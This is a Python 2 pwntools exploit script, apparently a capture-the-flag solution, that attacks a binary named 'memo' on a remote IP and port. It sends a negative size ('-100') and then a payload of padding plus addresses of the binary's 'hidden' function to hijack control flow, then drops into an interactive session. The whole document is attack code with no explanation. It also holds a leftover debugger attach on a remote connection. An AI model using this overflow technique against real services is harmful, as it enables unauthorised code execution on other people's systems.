from pwn import *
context.log_level = 'debug'

TARGET = './memo'
HOST = '133.242.68.223'
PORT = 35285

# r = process(TARGET)
r = remote(HOST, PORT)

gdb.attach(r, '''
''')
elf = ELF(TARGET)


def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r.sendlineafter("size", "-100")
payload = ''
payload += 'A'*8
payload += p64(elf.sym['hidden']-1)
payload += p64(elf.sym['hidden'])
r.sendlineafter("Content :", payload)


r.interactive()
r.close()
